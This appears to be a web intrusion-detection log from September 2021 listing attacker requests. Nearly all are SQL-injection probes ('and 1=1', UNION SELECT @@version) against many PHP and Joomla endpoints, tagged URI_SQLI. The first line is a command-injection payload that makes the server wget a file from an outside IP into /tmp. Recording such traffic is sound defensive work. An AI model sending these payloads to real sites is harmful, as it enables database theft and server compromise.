2021-09-04T11:19	/appliancews/getLicense?hostName=$(/usr/bin/wget%20http://1.1.1.1:12345/file%20-O%20/tmp/dsifnfnfdwsFFS)	s2b-1330-5
2021-09-04T11:19	/index.php?option=com_zhyandexmap&amp;view=zhyandexmap&amp;tmpl=component&amp;id=3&amp;placemarklistid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin/users/?sort=login&edit=1 and 1=1::/www/admin/template/?edit=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin/users/?sort=login&edit=1 and 1=1::/www/admin/template/?edit=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/phpsqlsearch_genxml.php?subcategory=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/phpsqlsearch_genxml.php?subcategory=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?page=news&nid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?page=news&nid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/viewprofile.php?profid=1 and 1=1::/www/viewmessage.php?sender_id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/viewprofile.php?profid=1 and 1=1::/www/viewmessage.php?sender_id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin/members_view.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin/members_view.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/add_to_cart.php?product_id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/add_to_cart.php?product_id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin/editadgroup.php?groupid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin/editadgroup.php?groupid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/office_admin/?pid=95&action=print_charactercertificate&id=1 and 1=1::/www/office_admin/?pid=95&action=edit&id=31 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/office_admin/?pid=95&action=print_charactercertificate&id=1 and 1=1::/www/office_admin/?pid=95&action=edit&id=31 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/?photo=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/?photo=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?action=lookup-county&state=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?action=lookup-county&state=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin/admin_process.php?act=editpollform&id=1 and 1=1::/www/admin/admin_process.php?act=cateditform&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin/admin_process.php?act=editpollform&id=1 and 1=1::/www/admin/admin_process.php?act=cateditform&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin_process.php?act=vdoeditform&id=1 and 1=1::/www/admin/admin_process.php?act=cateditform&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin_process.php?act=vdoeditform&id=1 and 1=1::/www/admin/admin_process.php?act=cateditform&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?S=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?S=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/product_view1.php?pid=1 and 1=1::/www/productcompanyinfo.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/product_view1.php?pid=1 and 1=1::/www/productcompanyinfo.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/rate.php?value=1 and 1=1::/www/content.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/rate.php?value=1 and 1=1::/www/content.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?nice_theme=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?nice_theme=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/resources.php?action=category&sort=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/resources.php?action=category&sort=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/searchCommercial.php?property_type=1 and 1=1&city=1 and 1=1&posted_by=1 and 1=1::/www/searchResidential.php?property_type=1 and 1=1&city=1 and 1=1&bedroom=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/searchCommercial.php?property_type=1 and 1=1&city=1 and 1=1&posted_by=1 and 1=1::/www/searchResidential.php?property_type=1 and 1=1&city=1 and 1=1&bedroom=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/status_list.php?status_id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/status_list.php?status_id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/restaurant-menu.php?resid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/restaurant-menu.php?resid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/view/friend_profile.php?friend_type=Student&friend_index=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/view/friend_profile.php?friend_type=Student&friend_index=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/single.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/single.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/listings.php?catid=1 and 1=1::/www/ads-details.php?ID=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/listings.php?catid=1 and 1=1::/www/ads-details.php?ID=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/show-flight-result.php?fl_orig=1 and 1=1::/www/show-flight-result.php?fl_dest=1 and 1=1::/www/pages.php?id=1 and 1=1::/www/content.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/show-flight-result.php?fl_orig=1 and 1=1::/www/show-flight-result.php?fl_dest=1 and 1=1::/www/pages.php?id=1 and 1=1::/www/content.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/product.php?id=1 and 1=1::/www/search.php?category_id=1&sub_category_id=1 and 1=1::/www/search.php?category_id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/product.php?id=1 and 1=1::/www/search.php?category_id=1&sub_category_id=1 and 1=1::/www/search.php?category_id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/searchJob.php?jobType=1 and 1=1&jobFrequency=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/searchJob.php?jobType=1 and 1=1&jobFrequency=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/item_details.php?id=1 and 1=1::/www/vendor_details.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/item_details.php?id=1 and 1=1::/www/vendor_details.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/browse-category.php?cat=1 and 1=1::/www/browse-scategory.php?sc=1 and 1=1::/www/service-provider.php?ser=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/browse-category.php?cat=1 and 1=1::/www/browse-scategory.php?sc=1 and 1=1::/www/service-provider.php?ser=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/search_item.php?search=1 and 1=1::/www/general_item_details.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/search_item.php?search=1 and 1=1::/www/general_item_details.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/latest_news_details.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/latest_news_details.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/profile.php?u=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/profile.php?u=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/group.php?grid=1 and 1=1::/www/profile.php?fid=1 and 1=1::/www/company_details.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/group.php?grid=1 and 1=1::/www/profile.php?fid=1 and 1=1::/www/company_details.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/itechd.php?productid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/itechd.php?productid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/show-flight-result.php?&fl_orig=1 and 1=1::/www/show-flight-result.php?fl_dest=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/show-flight-result.php?&fl_orig=1 and 1=1::/www/show-flight-result.php?fl_dest=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/Employer_Details.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/Employer_Details.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/subpage.php?scat=1 and 1=1::/www/message.php?pid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/subpage.php?scat=1 and 1=1::/www/message.php?pid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/catcompany.php?token=1 and 1=1::/www/buyleads-details.php?id=1 and 1=1::/www/company/index.php?c=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/catcompany.php?token=1 and 1=1::/www/buyleads-details.php?id=1 and 1=1::/www/company/index.php?c=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/movie.php?f=1 and 1=1::/www/tvshow.php?s=1 and 1=1::/www/show_misc_video.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/movie.php?f=1 and 1=1::/www/tvshow.php?s=1 and 1=1::/www/show_misc_video.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/browse-category.php?cat=1 and 1=1::/www/browse-scategory.php?sc=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/browse-category.php?cat=1 and 1=1::/www/browse-scategory.php?sc=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/single-cause.php?pid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/single-cause.php?pid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/search.php?cat_id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/search.php?cat_id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/domain.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/domain.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/list?gender=1 and 1=1&main_search=::/www/list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/list?gender=1 and 1=1&main_search=::/www/list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/jobsearch_all.php?rid1=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/jobsearch_all.php?rid1=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/category_list.php?search=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/category_list.php?search=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/product-category.php?key=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/product-category.php?key=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/courselist.php?subcatid=1 and 1=1::/www/courselist.php?popcourseid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/courselist.php?subcatid=1 and 1=1::/www/courselist.php?popcourseid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/product_details.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/product_details.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/service-list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/service-list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/tradeshow-list-detail.php?show_id=1 and 1=1::/www/view-product.php?pid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/tradeshow-list-detail.php?show_id=1 and 1=1::/www/view-product.php?pid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/search-results.php?Projectmain=1 and 1=1&search=::/www/search-results.php?proj_type=1 and 1=1&search=::/www/search-results.php?searchtext=1 and 1=1&search=::/www/search-results.php?sell_price=1 and 1=1&search=::/www/search-results.php?maxprice=1 and 1=1&search=::/www/search-results.php?maxprice=1 and 1=1&search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/search-results.php?Projectmain=1 and 1=1&search=::/www/search-results.php?proj_type=1 and 1=1&search=::/www/search-results.php?searchtext=1 and 1=1&search=::/www/search-results.php?sell_price=1 and 1=1&search=::/www/search-results.php?maxprice=1 and 1=1&search=::/www/search-results.php?maxprice=1 and 1=1&search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/booker_details.php?sourcebus=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/booker_details.php?sourcebus=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/other-user-profile.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/other-user-profile.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/service-list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/service-list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/service_detail.php?pid=1 and 1=1::/www/event_detail.php?eventid=1 and 1=1::/www/news_detail.php?newid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/service_detail.php?pid=1 and 1=1::/www/event_detail.php?eventid=1 and 1=1::/www/news_detail.php?newid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/categories?subctid=1 and 1=1::/www/categories?&mctid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/categories?subctid=1 and 1=1::/www/categories?&mctid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/jobdetails.php?pr_id=1 and 1=1::/www/searchbycat_list.php?catid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/jobdetails.php?pr_id=1 and 1=1::/www/searchbycat_list.php?catid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/event-list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/event-list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/quicksearch.php?q=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/quicksearch.php?q=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/investcalc.php?price=1&projid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/investcalc.php?price=1&projid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/lawyer-list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/lawyer-list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/exams.php?sort=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/exams.php?sort=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/single_detail.php?sid=1 and 1=1::/www/category.php?searchcat=1 and 1=1::/www/category.php?chid1=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/single_detail.php?sid=1 and 1=1::/www/category.php?searchcat=1 and 1=1::/www/category.php?chid1=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/service-list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/service-list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/categories?subctid=1 and 1=1::/www/categories?&mctid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/categories?subctid=1 and 1=1::/www/categories?&mctid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/single-video-detail.php?video_id=MTMy&report_videos[]=1 and 1=1&report_submit=	script-HTTP::URI_SQLI
2021-09-04T11:19	/single-video-detail.php?video_id=MTMy&report_videos[]=1 and 1=1&report_submit=	script-HTTP::URI_SQLI
2021-09-04T11:19	/property-list?tbud=5001-100001 and 1=1&quicksrch1=	script-HTTP::URI_SQLI
2021-09-04T11:19	/property-list?tbud=5001-100001 and 1=1&quicksrch1=	script-HTTP::URI_SQLI
2021-09-04T11:19	/category.php?searchmain=1 and 1=1&searchcat=1 and 1=1::/www/single_detail.php?sid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/category.php?searchmain=1 and 1=1&searchcat=1 and 1=1::/www/single_detail.php?sid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/list?city=1 and 1=1&main_search=	script-HTTP::URI_SQLI
2021-09-04T11:19	/success-story.php?succid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/success-story.php?succid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/findcity.php?q=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/findcity.php?q=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/trailer-detail.php?moid=1 and 1=1::/www/show-time.php?moid=1 and 1=1::/www/event-detail.php?eid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/trailer-detail.php?moid=1 and 1=1::/www/show-time.php?moid=1 and 1=1::/www/event-detail.php?eid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/findcity.php?q=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/findcity.php?q=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/news_detail.php?newid=1 and 1=1::/www/event_detail.php?eventid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/news_detail.php?newid=1 and 1=1::/www/event_detail.php?eventid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/news-detail.php?newid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/news-detail.php?newid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/countrycode1.php?val=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/countrycode1.php?val=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/city_ajax.php?state_id=1 and 1=1::/www/category_list.php?search=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/city_ajax.php?state_id=1 and 1=1::/www/category_list.php?search=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/success-story.php?succid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/success-story.php?succid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/city.php?country=1 and 1=1&state=1 and 1=1::/www/state.php?country=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/city.php?country=1 and 1=1&state=1 and 1=1::/www/state.php?country=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/preview.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/preview.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/search_result.php?marital=1 and 1=1&submit::/www/search_result.php?gender=1 and 1=1&submit::/www/search_result.php?country=1 and 1=1&submit::/www/search_result.php?profileid=1 and 1=1&submit	script-HTTP::URI_SQLI
2021-09-04T11:19	/search_result.php?marital=1 and 1=1&submit::/www/search_result.php?gender=1 and 1=1&submit::/www/search_result.php?country=1 and 1=1&submit::/www/search_result.php?profileid=1 and 1=1&submit	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin/userview.php?uid=1 and 1=1::/www/admin/viewemcamp.php?fnum=1 and 1=1::/www/admin/viewvisitcamp.php?fn=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/admin/userview.php?uid=1 and 1=1::/www/admin/viewemcamp.php?fnum=1 and 1=1::/www/admin/viewvisitcamp.php?fn=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jbuildozer&view=entriessearch&tmpl=component&mode=module&tpl=3&appid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jbuildozer&view=entriessearch&tmpl=component&mode=module&tpl=3&appid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php/en/component/jequestions/?view=tags&an=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php/en/component/jequestions/?view=tags&an=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jevideogallery&view=category&id=991 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jevideogallery&view=category&id=991 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jefaqpro&view=category&id=1 and 1=1&Itemid=494	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jefaqpro&view=category&id=1 and 1=1&Itemid=494	script-HTTP::URI_SQLI
2021-09-04T11:19	/ajax.php?p=video&do=getplayer&vid=randomid&aid=1&player=detail&playlist=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/ajax.php?p=video&do=getplayer&vid=randomid&aid=1&player=detail&playlist=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/event.php?event_id=-123 union all select 1,2,@@version,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--	script-HTTP::URI_SQLI
2021-09-04T11:19	/event.php?event_id=-123 union all select 1,2,@@version,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--	script-HTTP::URI_SQLI
2021-09-04T11:19	/listing?keywords=1 and 1=1&location=All United States&placetype=country&placeid=2311 and 1=1&cat=1 and 1=1&subcat=51 and 1=1&filter=&sort=Newest&Submit=' UNION ALL SELECT NULL,CONCAT(version(),0x7e7e,database()),NULL-- gLLf	script-HTTP::URI_SQLI
2021-09-04T11:19	/listing?keywords=1 and 1=1&location=All United States&placetype=country&placeid=2311 and 1=1&cat=1 and 1=1&subcat=51 and 1=1&filter=&sort=Newest&Submit=' UNION ALL SELECT NULL,CONCAT(version(),0x7e7e,database()),NULL-- gLLf	script-HTTP::URI_SQLI
2021-09-04T11:19	/search/?q=&price_type=range&price=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/search/?q=&price_type=range&price=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/livecrm/web/index.php?r=site/login&company_id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/livecrm/web/index.php?r=site/login&company_id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/site_search.php?s_vehicletype=auto&s_order=1 and 1=1&s_row=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/site_search.php?s_vehicletype=auto&s_order=1 and 1=1&s_row=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?id=1 and 1=1::/www/mobile_preview.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?id=1 and 1=1::/www/mobile_preview.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/sellers_subcategories.php?IndustryID=1 and 1=1::/www/suppliers.php?IndustryID=1 and 1=1&CategoryID=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/sellers_subcategories.php?IndustryID=1 and 1=1::/www/suppliers.php?IndustryID=1 and 1=1&CategoryID=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/pages/single_blog.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/pages/single_blog.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/product-list.php?srch=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/product-list.php?srch=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/site.php?id=1 and 1=1::/www/pagelist.php?id=1 and 1=1::/www/page_new.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/site.php?id=1 and 1=1::/www/pagelist.php?id=1 and 1=1::/www/page_new.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/chat_im/chat_window.php?request_id=1 and 1=1::/www/search_events.php?category=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/chat_im/chat_window.php?request_id=1 and 1=1::/www/search_events.php?category=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_visualcalendar&view=load&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_visualcalendar&view=load&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_cpeventcalendar&task=load&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_cpeventcalendar&task=load&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jeclassifieds&view=boutique&sid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jeclassifieds&view=boutique&sid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/event.php?id=1 and 1=1::/www/page.php?slug=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/event.php?id=1 and 1=1::/www/page.php?slug=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jereverseauction&view=products&layout=default_message&tmpl=component&id=1 and 1=1&uid=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jereverseauction&view=products&layout=default_message&tmpl=component&id=1 and 1=1&uid=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jmsmusic&view=search&keyword=1 and 1=1::/www/index.php?option=com_jmsmusic&view=search&artist=1 and 1=1::/www/index.php?option=com_jmsmusic&view=search&username=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_jmsmusic&view=search&keyword=1 and 1=1::/www/index.php?option=com_jmsmusic&view=search&artist=1 and 1=1::/www/index.php?option=com_jmsmusic&view=search&username=1 and 1=1	script-HTTP::URI_SQLI
